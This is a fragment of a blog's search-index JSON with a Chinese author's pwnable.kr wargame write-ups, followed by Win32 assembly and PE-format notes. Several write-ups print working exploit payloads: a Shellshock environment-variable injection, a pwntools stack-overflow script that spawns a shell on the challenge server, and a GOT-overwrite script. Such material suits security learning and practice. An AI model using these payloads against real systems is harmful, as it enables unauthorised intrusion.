        "excerpt":"     刷pwnable。。。    题目:input - 4 pt   Mom? how can I pass my input to a computer program? 妈妈，我应该怎么样在电脑程序中跳过我的输入。 ssh input2@pwnable.kr -p2222 (pw:guest)   writeup   二话不说，首先上来cat flag。肯定没权限，然后看一下源码。   #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt;  int main(int argc, char* argv[], char* envp[]){ \tprintf(\"Welcome to pwnable.kr\\n\"); \tprintf(\"Let's see if you know how to give input to program\\n\"); \tprintf(\"Just give me correct inputs then you will get the flag :)\\n\");  \t// argv \tif(argc != 100) return 0; \tif(strcmp(argv['A'],\"\\x00\")) return 0; \tif(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; \tprintf(\"Stage 1 clear!\\n\");  \t// stdio \tchar buf[4]; \tread(0, buf, 4); \tif(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; \tread(2, buf, 4);         if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; \tprintf(\"Stage 2 clear!\\n\");  \t// env \tif(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; \tprintf(\"Stage 3 clear!\\n\");  \t// file \tFILE* fp = fopen(\"\\x0a\", \"r\"); \tif(!fp) return 0; \tif( fread(buf, 4, 1, fp)!=1 ) return 0; \tif( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; \tfclose(fp); \tprintf(\"Stage 4 clear!\\n\");  \t// network \tint sd, cd; \tstruct sockaddr_in saddr, caddr; \tsd = socket(AF_INET, SOCK_STREAM, 0); \tif(sd == -1){ \t\tprintf(\"socket error, tell admin\\n\"); \t\treturn 0; \t} \tsaddr.sin_family = AF_INET; \tsaddr.sin_addr.s_addr = INADDR_ANY; \tsaddr.sin_port = htons( atoi(argv['C']) ); \tif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ \t\tprintf(\"bind error, use another port\\n\");     \t\treturn 1; \t} \tlisten(sd, 1); \tint c = sizeof(struct sockaddr_in); \tcd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); \tif(cd &lt; 0){ \t\tprintf(\"accept error, tell admin\\n\"); \t\treturn 0; \t} \tif( recv(cd, buf, 4, 0) != 4 ) return 0; \tif(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; \tprintf(\"Stage 5 clear!\\n\");  \t// here's your flag \tsystem(\"/bin/cat flag\"); \treturn 0; }    惊了，这是要闯关的么。。。 这道题有点麻烦。。。 一共有五个阶段，需要突破，自己没有太多的理解。感觉基础差太多了，像进程间通信，Linux管道技术，网络 编程，都需要加强。 所以的话。。先放一放吧。。  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-7.html",
        "teaser":null},{
        "title": "Pwnable刷题 8",
        "excerpt":"     刷pwnable。。。    题目:leg - 2 pt   Daddy told me I should study arm. But I prefer to study my leg! 爸爸告诉我应该去学习arm汇编 但是我更喜欢去学习脚。。。。。。   Download : http://pwnable.kr/bin/leg.c   Download : http://pwnable.kr/bin/leg.asm   ssh leg@pwnable.kr -p2222 (pw:guest)   writeup   源码：   #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt;  int key1(){ \tasm(\"mov r3, pc\\n\"); } int key2(){ \tasm( \t\"push\t{r6}\\n\" \t\"add\tr6, pc, $1\\n\" \t\"bx\tr6\\n\" \t\".code   16\\n\" \t\"mov\tr3, pc\\n\" \t\"add\tr3, $0x4\\n\" \t\"push\t{r3}\\n\" \t\"pop\t{pc}\\n\" \t\".code\t32\\n\" \t\"pop\t{r6}\\n\" \t); } int key3(){ \tasm(\"mov r3, lr\\n\"); } int main(){ \tint key=0; \tprintf(\"Daddy has very strong arm! : \"); \tscanf(\"%d\", &amp;key); \tif( (key1()+key2()+key3()) == key ){ \t\tprintf(\"Congratz!\\n\"); \t\tint fd = open(\"flag\", O_RDONLY); \t\tchar buf[100]; \t\tint r = read(fd, buf, 100); \t\twrite(0, buf, r); \t} \telse{ \t\tprintf(\"I have strong leg :P\\n\"); \t} \treturn 0; }   (gdb) disass main Dump of assembler code for function main:    0x00008d3c &lt;+0&gt;:\tpush\t{r4, r11, lr}    0x00008d40 &lt;+4&gt;:\tadd\tr11, sp, #8    0x00008d44 &lt;+8&gt;:\tsub\tsp, sp, #12    0x00008d48 &lt;+12&gt;:\tmov\tr3, #0    0x00008d4c &lt;+16&gt;:\tstr\tr3, [r11, #-16]    0x00008d50 &lt;+20&gt;:\tldr\tr0, [pc, #104]\t; 0x8dc0 &lt;main+132&gt;    0x00008d54 &lt;+24&gt;:\tbl\t0xfb6c &lt;printf&gt;    0x00008d58 &lt;+28&gt;:\tsub\tr3, r11, #16    0x00008d5c &lt;+32&gt;:\tldr\tr0, [pc, #96]\t; 0x8dc4 &lt;main+136&gt;    0x00008d60 &lt;+36&gt;:\tmov\tr1, r3    0x00008d64 &lt;+40&gt;:\tbl\t0xfbd8 &lt;__isoc99_scanf&gt;    0x00008d68 &lt;+44&gt;:\tbl\t0x8cd4 &lt;key1&gt;    0x00008d6c &lt;+48&gt;:\tmov\tr4, r0    0x00008d70 &lt;+52&gt;:\tbl\t0x8cf0 &lt;key2&gt;    0x00008d74 &lt;+56&gt;:\tmov\tr3, r0    0x00008d78 &lt;+60&gt;:\tadd\tr4, r4, r3    0x00008d7c &lt;+64&gt;:\tbl\t0x8d20 &lt;key3&gt;    0x00008d80 &lt;+68&gt;:\tmov\tr3, r0    0x00008d84 &lt;+72&gt;:\tadd\tr2, r4, r3    0x00008d88 &lt;+76&gt;:\tldr\tr3, [r11, #-16]    0x00008d8c &lt;+80&gt;:\tcmp\tr2, r3    0x00008d90 &lt;+84&gt;:\tbne\t0x8da8 &lt;main+108&gt;    0x00008d94 &lt;+88&gt;:\tldr\tr0, [pc, #44]\t; 0x8dc8 &lt;main+140&gt;    0x00008d98 &lt;+92&gt;:\tbl\t0x1050c &lt;puts&gt;    0x00008d9c &lt;+96&gt;:\tldr\tr0, [pc, #40]\t; 0x8dcc &lt;main+144&gt;    0x00008da0 &lt;+100&gt;:\tbl\t0xf89c &lt;system&gt;    0x00008da4 &lt;+104&gt;:\tb\t0x8db0 &lt;main+116&gt;    0x00008da8 &lt;+108&gt;:\tldr\tr0, [pc, #32]\t; 0x8dd0 &lt;main+148&gt;    0x00008dac &lt;+112&gt;:\tbl\t0x1050c &lt;puts&gt;    0x00008db0 &lt;+116&gt;:\tmov\tr3, #0    0x00008db4 &lt;+120&gt;:\tmov\tr0, r3    0x00008db8 &lt;+124&gt;:\tsub\tsp, r11, #8    0x00008dbc &lt;+128&gt;:\tpop\t{r4, r11, pc}    0x00008dc0 &lt;+132&gt;:\tandeq\tr10, r6, r12, lsl #9    0x00008dc4 &lt;+136&gt;:\tandeq\tr10, r6, r12, lsr #9    0x00008dc8 &lt;+140&gt;:\t\t\t; &lt;UNDEFINED&gt; instruction: 0x0006a4b0    0x00008dcc &lt;+144&gt;:\t\t\t; &lt;UNDEFINED&gt; instruction: 0x0006a4bc    0x00008dd0 &lt;+148&gt;:\tandeq\tr10, r6, r4, asr #9 End of assembler dump. (gdb) disass key1 Dump of assembler code for function key1:    0x00008cd4 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)    0x00008cd8 &lt;+4&gt;:\tadd\tr11, sp, #0    0x00008cdc &lt;+8&gt;:\tmov\tr3, pc    0x00008ce0 &lt;+12&gt;:\tmov\tr0, r3    0x00008ce4 &lt;+16&gt;:\tsub\tsp, r11, #0    0x00008ce8 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)    0x00008cec &lt;+24&gt;:\tbx\tlr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2:    0x00008cf0 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)    0x00008cf4 &lt;+4&gt;:\tadd\tr11, sp, #0    0x00008cf8 &lt;+8&gt;:\tpush\t{r6}\t\t; (str r6, [sp, #-4]!)    0x00008cfc &lt;+12&gt;:\tadd\tr6, pc, #1    0x00008d00 &lt;+16&gt;:\tbx\tr6    0x00008d04 &lt;+20&gt;:\tmov\tr3, pc    0x00008d06 &lt;+22&gt;:\tadds\tr3, #4    0x00008d08 &lt;+24&gt;:\tpush\t{r3}    0x00008d0a &lt;+26&gt;:\tpop\t{pc}    0x00008d0c &lt;+28&gt;:\tpop\t{r6}\t\t; (ldr r6, [sp], #4)    0x00008d10 &lt;+32&gt;:\tmov\tr0, r3    0x00008d14 &lt;+36&gt;:\tsub\tsp, r11, #0    0x00008d18 &lt;+40&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)    0x00008d1c &lt;+44&gt;:\tbx\tlr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3:    0x00008d20 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)    0x00008d24 &lt;+4&gt;:\tadd\tr11, sp, #0    0x00008d28 &lt;+8&gt;:\tmov\tr3, lr    0x00008d2c &lt;+12&gt;:\tmov\tr0, r3    0x00008d30 &lt;+16&gt;:\tsub\tsp, r11, #0    0x00008d34 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)    0x00008d38 &lt;+24&gt;:\tbx\tlr End of assembler dump. (gdb)   ARM 平台，不懂啊，先留着再说吧。。。。。  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-8.html",
        "teaser":null},{
        "title": "Pwnable刷题 9",
        "excerpt":"     刷pwnable。。。    题目:mistake - 1 pt   We all make mistakes, let’s move on. (don’t take this too seriously, no fancy hacking skill is required at all) 我们都会犯错误，没关系，向前看。 别太在意这个。 This task is based on real event Thanks to dhmonkey 这个任务是基于一个真实的事件，谢谢dhmonkey。 hint : operator priority 提示：操作符优先级 ssh mistake@pwnable.kr -p2222 (pw:guest)   writeup   #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt;  #define PW_LEN 10 #define XORKEY 1  void xor(char* s, int len){ \tint i; \tfor(i=0; i&lt;len; i++){ \t\ts[i] ^= XORKEY; \t} }  int main(int argc, char* argv[]){  \tint fd; \tif(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0){ \t\tprintf(\"can't open password %d\\n\", fd); \t\treturn 0; \t}  \tprintf(\"do not bruteforce...\\n\"); \tsleep(time(0)%20);  \tchar pw_buf[PW_LEN+1]; \tint len; \tif(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ \t\tprintf(\"read error\\n\"); \t\tclose(fd); \t\treturn 0;\t\t \t}  \tchar pw_buf2[PW_LEN+1]; \tprintf(\"input password : \"); \tscanf(\"%10s\", pw_buf2);  \t// xor your input \txor(pw_buf2, 10);  \tif(!strncmp(pw_buf, pw_buf2, PW_LEN)){ \t\tprintf(\"Password OK\\n\"); \t\tsystem(\"/bin/cat flag\\n\"); \t} \telse{ \t\tprintf(\"Wrong Password\\n\"); \t}  \tclose(fd); \treturn 0; }      &lt;的优先级大于=的优先级，所以fd一直等于0，所以read()等函数可以用fd当作文件描述符来读入字符。   要得到flag，只要输入的每一位和1进行xor后就是输出的。   mistake@ubuntu:~$ ./mistake do not bruteforce... 0000000000 input password : 1111111111 Password OK Mommy, the operator priority always confuses me :(  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-9.html",
        "teaser":null},{
        "title": "Pwnable刷题 10",
        "excerpt":"     刷pwnable。。。    题目:shellshock - 1 pt [writeup]   Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :) 妈妈，这有一个关于bash的令人震惊的新闻。 我打赌你已经知道了，但是这仅仅来确认是不是。 ssh shellshock@pwnable.kr -p2222 (pw:guest)   writeup   env x=’() { :;}; echo vulnerable’ ./bash -c “echo this is a test” 发现bash存在shellshock漏洞   直接打出flag env x=’() { :;}; /bin/cat flag’ ./shellshock   shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag ' ./shellshock only if I knew CVE-2014-6271 ten years ago..!! Segmentation fault  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-10.html",
        "teaser":null},{
        "title": "Pwnable刷题 2",
        "excerpt":"     刷pwnable。。。    题目:collision - 3 pt   Daddy told me about cool MD5 hash collision today. I wanna do something like that too! 爸爸告诉我cool的md5碰撞。。。 我也想做一些和这个差不多的事情。(搞事情??!!)   ssh col@pwnable.kr -p2222 (pw:guest)   writeup   登陆查看。   col@ubuntu:~$ ls col  col.c  flag   flag没有权限打开，运行col文件： usage : ./col [passcode] passcode length should be 20 bytes 直接查看源代码：   #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p) {     int* ip = (int*)p;     int i;     int res=0;     for(i=0; i&lt;5; i++){             res += ip[i];     }     return res; }  int main(int argc, char* argv[]) {     if(argc&lt;2){             printf(\"usage : %s [passcode]\\n\", argv[0]);             return 0;     }     if(strlen(argv[1]) != 20){             printf(\"passcode length should be 20 bytes\\n\");             return 0;     }      if(hashcode == check_password( argv[1] )){             system(\"/bin/cat flag\");             return 0;     }     else             printf(\"wrong passcode.\\n\");     return 0; }      首先看main函数，判断运行参数，为密码passcode，其次长度为20bytes。再带哦用check_password函数判断，相等则输出flag。   关于check函数的作用就是将输入的数据用整型转换，求和返回。   主要是写shellcode和纠结带参数的py怎么写，还是有很多问题，ssh参考了网上的模板。   可以这样：   ./col `python -c \"print '\\x01' * 16 + '\\xE8\\x05\\xD9\\x1D'\"`   或者exp：   from pwn import * import os  pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222) print (pwn_ssh.connected())  sh=pwn_ssh.process(argv=['./col','\\x01' * 16 + '\\xE8\\x05\\xD9\\x1D']) print (sh.recvall())   返回如下：   [+] Connecting to pwnable.kr on port 2222: Done [!] Couldn't check security settings on 'pwnable.kr' True [+] Starting remote process './col' on pwnable.kr: pid 53488 [+] Receiving all data: Done (52B) [*] Stopped remote process 'col' on pwnable.kr (pid 53488) daddy! I just managed to create a hash collision :)   所以flag:daddy! I just managed to create a hash collision :)  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-2.html",
        "teaser":null},{
        "title": "Pwnable刷题 3",
        "excerpt":"     刷pwnable。。。    题目:bof - 5 pt   Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? 娜娜告诉我缓冲区溢出是最常见的软件漏洞之一，这是真的么？   Download : http://pwnable.kr/bin/bof   Download : http://pwnable.kr/bin/bof.c   Running at : nc pwnable.kr 9000   writeup   栈溢出问题。 首先查看源代码。   #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key) { \tchar overflowme[32]; \tprintf(\"overflow me : \"); \tgets(overflowme);\t// smash me! \tif(key == 0xcafebabe){ \t\tsystem(\"/bin/sh\"); \t} \telse{ \t\tprintf(\"Nah..\\n\"); \t} } int main(int argc, char* argv[]) { \tfunc(0xdeadbeef); \treturn 0; }   本来以为是普通的栈溢出的，没想到仔细一看：   checksec  bof [*] '/root/zjgcjy/pwn/bof'     Arch:     i386-32-little     RELRO:    Partial RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled   好像开了各种保护，但是再仔细一看，其实不然。 这个题目就只要比较是否相等就行，没有执行栈上的数据，所以开保护没事。 用gdb调试查看栈分布，然后溢出就行了。   from pwn import *  #pwn_socket= process('./bof') pwn_socket=remote('pwnable.kr',9000)  shellcode = \"\\xbe\\xba\\xfe\\xca\" payload = 'A' * (52) + shellcode pwn_socket.send(payload) pwn_socket.interactive()   得到shell后cat flag得到flag。 flag:daddy, I just pwned a buFFer :)  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html",
        "teaser":null},{
        "title": "Pwnable刷题 4",
        "excerpt":"     刷pwnable。。。    题目:flag - 7 pt   Papa brought me a packed present! let’s open it. 啪啪给我带来了一个礼物，让我们打开吧。   Download : http://pwnable.kr/bin/flag   This is reversing task. all you need is binary 这是逆向工程任务，你所需要的就是二进制分析。   writeup   就是一个elf文件，Ubuntu下运行就一句话，然后用ida打开，发现有upx，应该是加了壳，所以直接脱壳(自动脱)，脱下来看见在malloc()中压入了一个flag参数，交叉引用之后发现了 flag:  UPX…? sounds like a delivery service :)  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-4.html",
        "teaser":null},{
        "title": "Pwnable刷题 5",
        "excerpt":"     刷pwnable。。。    题目:passcode - 10 pt   Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that?   妈妈告诉我去做一个密码基于本地系统， 我的初始化c代码已经编程成功了，没有任何错误， 但是，这有一下编译的警告，但是谁在意呢？-_-   ssh passcode@pwnable.kr -p2222 (pw:guest)   writeup   首先还是远程连接了，连接上去看看有什么。 三个文件。   passcode@ubuntu:~$ ls flag  passcode  passcode.c passcode@ubuntu:~$ ./passcode Toddler\\'s Secure Login System 1.0 beta. enter you name : chen Welcome chen! enter passcode1 : 1 Segmentation fault   惊了,还没怎么运行就报错了，直接看源代码。    #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;  void login(){     int passcode1;     int passcode2;      printf(\"enter passcode1 : \");     scanf(\"%d\", passcode1);     fflush(stdin);      // ha! mommy told me that 32bit is vulnerable to bruteforcing :)     printf(\"enter passcode2 : \");     scanf(\"%d\", passcode2);      printf(\"checking...\\n\");     if(passcode1==338150 &amp;&amp; passcode2==13371337){             printf(\"Login OK!\\n\");             system(\"/bin/cat flag\");     }     else{             printf(\"Login Failed!\\n\");             exit(0);     } }  void welcome(){     char name[100];     printf(\"enter you name : \");     scanf(\"%100s\", name);     printf(\"Welcome %s!\\n\", name); }  int main(){     printf(\"Toddler's Secure Login System 1.0 beta.\\n\");      welcome();     login();      // something after login...     printf(\"Now I can safely trust you that you have credential :)\\n\");     return 0; }      首先看main()，输出之后调用welcome函数，再调用login函数，之后打印正确吧。   看welcome()，输入name。没什么东西。   fflush(stdin)是一个计算机专业术语，功能是清空输入缓冲区，通常是为了确保不影响后面的数据读取（例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行fflush(stdin);）。   login()函数中，先后调用scanf()获取用户输入的两个passcode然后分别与338150和13371337作比较，如果相等的话，便会打印flag。这程序设计的逻辑似乎没啥问题，但是仔细一看，发现这里：   printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1);   没有加取地址符号&amp;，程序会默认从栈中读取4个字节的数据当做scanf取的地址。漏洞就发生在这里，可以利用GOT覆写技术攻击这个程序。这个的意思就是passcode1使用值传递，原来栈中间是什么值就取这个值，但是scanf会以为是地址，所以会向一个未知地址写值。虽然写入的值还是对的，但是地址未知。意思就是我们可以操控passcode1到任意地址，也就是说scanf是向某个地址写数据。如果我们获得了fflush@plt()的地址，我们可以向got表中写入指令。     将一个GOT表中的函数地址写到栈中，用来充当scanf（）取的地址，然后把system(“/bin/cat flag”)这条指令的地址写到这个GOT表中的函数。当这个函数被调用时，就会直接执行system(“/bin/cat flag”)   现在查看一下GOT表中fflush()的位置，很多方法可以查看elf文件的GOT表，这里说两个常用的命令： readelf -r elf objdump -R elf   总结，这个漏洞就是先改scanf指向的地址，使其指向got表，然后输入的就是执行函数的地址。   可以找到system(“/bin/cat flag”)对应汇编代码开始于0x80485e3（这里有两条指令，第一条将参数”/bin/cat flag”入栈，第二条调用system()）也就是说要把0x80485e3这个值写入fflush()中。   #!/usr/bin/python from pwn import *  name_addr=0xffffd078 pass1_addr=0xffffd0d8 fflush_got = 0x0804a004 system_addr = 0x80485e3  pwn_ssh=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222) print pwn_ssh.connected() sh=pwn_ssh.process(executable=\"./passcode\") print sh.recv()  shellcode = 'A' *(pass1_addr-name_addr) payload = shellcode + p32(fflush_got) + str(system_addr) sh.sendline(payload) print sh.recvall()   flag:Sorry mom.. I got confused about scanf usage :(  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html",
        "teaser":null},{
        "title": "Pwnable刷题 6",
        "excerpt":"     刷pwnable。。。    题目:random - 1 pt   Daddy, teach me how to use random value in programming! 爸爸，教我怎么在程序中使用随机值好吗？ ssh random@pwnable.kr -p2222 (pw:guest)   writeup   二话不说，上来先cat random.c。   #include &lt;stdio.h&gt;  int main(){ \tunsigned int random; \trandom = rand();\t// random value!  \tunsigned int key=0; \tscanf(\"%d\", &amp;key);  \tif( (key ^ random) == 0xdeadbeef ){ \t\tprintf(\"Good!\\n\"); \t\tsystem(\"/bin/cat flag\"); \t\treturn 0; \t}  \tprintf(\"Wrong, maybe you should try 2^32 cases.\\n\"); \treturn 0; }   显然是伪随机值，直接动态调试一下就出来了，然后xor求key的值，写脚本得flag。   #!/usr/bin/python from pwn import *  random=0x6b8b4567 key=0xdeadbeef ^ random  pwn_ssh=ssh(host='pwnable.kr',user='random',password='guest',port=2222) print pwn_ssh.connected() sh=pwn_ssh.process(executable=\"./random\") #print sh.recv()  payload=str(key) sh.sendline(payload)  print sh.recvall()  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-6.html",
        "teaser":null},{
        "title": "Win32asm 1",
        "excerpt":"     Windows 环境32位汇编语言程序设计    关于Windows的基础知识   80x86工作模式   实模式相当于是快速8086处理器，保护模式是主要模式，内存寻址为4GB，为了和8086兼容，提供虚拟模式。   可以从实模式切换到保护模式，再切换到虚拟模式。实模式和虚拟模式无法直接相互切换。   实模式   处理器复位或加电以实模式启动，寻址方式和8086方式相同，不能对内存进行分页管理，指令寻址中的地址就是实际内存的物理地址，所有段可读可写。中断处理方式和8086相同，采用中断向量表来确定中断位置。包括两个字节的段地址和两个字节的偏移量。可以使用32位寄存器，所有指令工作在ring 0级。   保护模式   所有32位地址线负责寻址，物理寻址空间4GB，支持内存分页，使用虚拟内存技术，支持多任务，支持优先级。 从实模式切换到保护模式：修改控制寄存器CR0的PE（位0）来实现，之前还需要建立保护模式必须的数据表，包括全局描述符表GDT和中断描述符表IDT。DOS运行在实模式下，Windows运行在保护模式下。   虚拟86模式   为了在保护模式下运行8086程序，实模式也可以运行，但是是单任务，而保护模式支持多任务，但是许多指令收到限制。 以任务模式运行在保护模式之上，内存位1MB，同时使用内存分页技术。 MS-DOS运行在虚拟86模式下。（Win7/10已经不是了，这句话只是说XP之前的。）   Windows内存管理   80386 内存寻址方式   由于可以使用全部的32位地址线，所以内存最大位4GB，任意一个通用寄存器就可以间接寻址。表面看段寄存器没什么用了，实际上，虽然在寻址上没有分段的限制，但需要控制某个地址空间是否可以读取，写入，执行的属性和其他参数，需要64位长度的数据，称64位的属性数据为 段描述符。   80386段寄存器是16位，无法放下64位信息，所以把所有的信息顺序放在内存指定位置，组成段描述符表。所以段寄存器当作索引用。称为段选择子。   段描述符表位置由新引入的2个寄存器来管理。48位的全局描述符表寄存器GDTR和16位局部描述表寄存器LDTR。   GDTR指向GDT，通常包括OS的代码段，数据段，堆栈段，和各任务的LDT段，GDT只有一个。   LDTR指向LDT，每个任务有个单独的LDT，包括任务单独的代码段，数据段，堆栈段。LDTR是指针，指向LDT对应在GDT位置。   段寄存器的第2位TI位表示段描述符的位置，TI=0表示GDT，TI=1表示LDT。   以xxxx:yyyyyyyy表示一个虚拟地址，首先看段寄存器的值，为xxxx。根据TI是0还是1确定下一步。且段寄存器始终指向段描述符，只是有的存在GDT，有的存在LDT中。   GDT寻址   如果TI=0，说明是段描述符在GDT中，根据GDTR中的基址找到GDT的地址，然后根据xxxx的高13位当作位置索引得到段描述符，根据段描述符的基址，限长，优先级得到段的起始地址，加上yyyyyyyy得到线性地址。   LDT寻址   如果TI=1，说明段描述符在LDT中，首先也是根据GDTR找到GDT的地址，然后根据LDTR的获取LDT的位置索引，在GDT中找到对应的LDT描述符，于是得到LDT的位置，再根据xxxx找到LDT中的段描述符，根据段描述符的基址，限长，优先级得到段的起始地址。再得到线性地址。  ","categories": [],
        "tags": ["windows"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32ASM-1.html",
        "teaser":null},{
        "title": "Win32asm 2",
        "excerpt":"     Windows 环境32位汇编语言程序设计    PE文件格式   概述   首先PE文件分为DOS部分，PE文件头，节表和节数据一共4部分。   DOS_Header   MZ格式的文件头由IMAGE_DOS_HEADER结构体定义。最开始的DOS可执行文件的标记，为MZ。 DOS_Header的大小为0x40。其中最后为PE文件头的偏移量：LONG AddressOfNewExeHeader，位置为文件头偏移0x003ch，大小为4字节。   DOS_Stub   可执行代码部分称为DOS stub。简单的显示一个“This program cannot be run in DOS mode.”。由于现在是NT结构，就不说了。   NT_Header (PE文件头)   NT_Header格式由IMAGE_NT_HEADER结构体定义。最开始是signature签名，被定义为00004550h，就是PE和两个0。   IMAGE_FILE_HEADER   结构体如下。   struct IMAGE_FILE_HEADER {     Machine                 运行平台     NumberOfSections        节数目     TimeDateStamp           创建时间，从 1970-01-01 00:00 开始     PointerToSymbolTable    符号表指针，用于调试     NumberOfSymbols         符号表中符号数量，用于调试     SizeOfOptionalHeader    Optional结构大小，紧挨FILE_HEADER，为0xe0     Characteristics         文件属性。exe一般是0x010f，dll一般是0x210e。 };   IMAGE_OPTINONAL_HEADER   optional结构体本意是让开发者在pe文件头中使用自定义的数据，但实际上IMAGE_FILE_HEADER不足以定义PE的属性，所以optional并不是可选的。   struct IMAGE_OPTIONAL_HEADER32 {     Magic                           0x107 ROM Image; 0x108 EXE Image     MajorLinkerVersion     MinorLinkerVersion     SizeOfCode                      代码节大小     SizeOfInitializedData           已初始化代码节大小     SizeOfUninitializedData         未初始化代码节大小     AddressOfEntryPoint             程序执行入口RVA     BaseOfCode                      代码节起始RVA     BaseOfData                      数据节其实RVA     ImageBase                       装载地址     SectionAlignment     FileAlignment     MajorOperatingSystemVersion     MinorOperatingSystemVersion     MajorImageVersion     MinorImageVersion     MajorSubsystemVersion     MinorSubsystemVersion     Win32VersionValue     SizeOfImage                     载入内存PE镜像大小     SizeOfHeaders                   载入内存所有头+节表大小     CheckSum     Subsystem                       文件子系统     DllCharacteristics     SizeOfStackReserve              初始化堆栈大小     SizeOfStackCommit               初始化实际提交堆栈大小     SizeOfHeapReserve               初始化保留的堆大小     SizeOfHeapCommit                初始化实际提交的堆大小     LoaderFlags     NumberOfRvaAndSizes             下面的数据目录结构数量     DataDirArray };   AddressOfEntryPoint   指出文件执行的入口地址，是RVA地址。如果在exe中附加了一段代码并希望先执行，只需要修改这个入口地址就行了。   ImageBase   文件优先装入的地址，当文件不需要重定位的时候最快。对于exe文件来说，每个文件总是独立使用虚拟地址空间，其地址不可能被其他模块占据，exe一般不需要重定位。对于dll来说，由于多个dll文件全部使用宿主exe文件的地址空间，不能确保地址没有被其他dll占用，所以dll必须包含重定位信息。一般exe默认是0x00400000，dll是0x10000000。   Subsystem   Windows_CUI     win32控制台 Windows_GUI     win32图形界面   DataDirArray   这个字段是比较重要的字段之一，各个节中的数据按照用途可以分为导出表，导入表，资源，重定位表数据块。要查看某个结构，就到这里查看某结构的位置和大小。   节表和节   PE文件到内存的映射   Windows在装载可执行程序时候，对DOS头，PE文件头和节表部分不做任何处理，装载节的时候，根据节的属性做不同的处理。所以在同属一个模块的内存页中，从不同映射过来的内存页的属性的不同的。节是相同属性的数据的集合，所以节在内存中的对齐单位必须是一个页的大小。节的规模有大有小，首先由于磁盘映像和内存映像中节的对齐单位不同，其次是对包含未初始化的节的处理，如.data节。也有不进行映射的节，比如.reloc节，重定位数据对于文件的执行代码来说是透明的，它只对Windows装载器使用。   节表   PE文件中所有的节的属性都被定义在节表中，有一系列IMAGE_SECTION_HEADER的结构体排列组成，紧跟着PE文件头，从PE文件头开始偏移0x00f8的地方。   struct IMAGE_SECTION_HEADER {     Name1                       8字节的节区名称     union Misc             PhysicalAddress                  VirtualSize         节区的实际大小     VirtualAddress              节区的RVA地址     SizeOfRawData               在文件中对齐的大小     PointerToRawData            文件中的偏移     PointerToRelocations             PointerToLinenumbers     NumberOfRelocations     NumberOfLinenumbers     Characteristics             节的属性 };   MASM32产生的exe文件中，代码节被命名为.text，可读写的数据节为.data，只读数据，导入表和导出表的节为.rdata，资源节为.rsrc。也有其他编译器将导入表放在.idata，中，代码节被命名为.code。   PointerToRawData   PointerToRawData 是指出了节在磁盘文件中的偏移地址，从文件头开始计算。   SizeOfRawData   SizeOfRawData 指出了某个节在磁盘文件中的大小。   映射方式   装载器从PE文件中找到某个节，即从PointerToRawData开始的大小为SizeOfRawData 的字节数据，把他们映射到内存中去，位置是从模块基址开始的偏移的VirtualAddress地方，并占用VirtualSize的值按照页大小的对齐。   RVA和文件偏移的转换   RVA是 relative virtual address的缩写，表示相对虚拟地址，是某个数据位置相对与文件头的位置。 对于DOS头，DOS stub，PE头，节表来说，无所谓RVA和文件偏移。因为他们在文件中和内存映射中的大小和偏移都不变。RVA只是对节来说的。 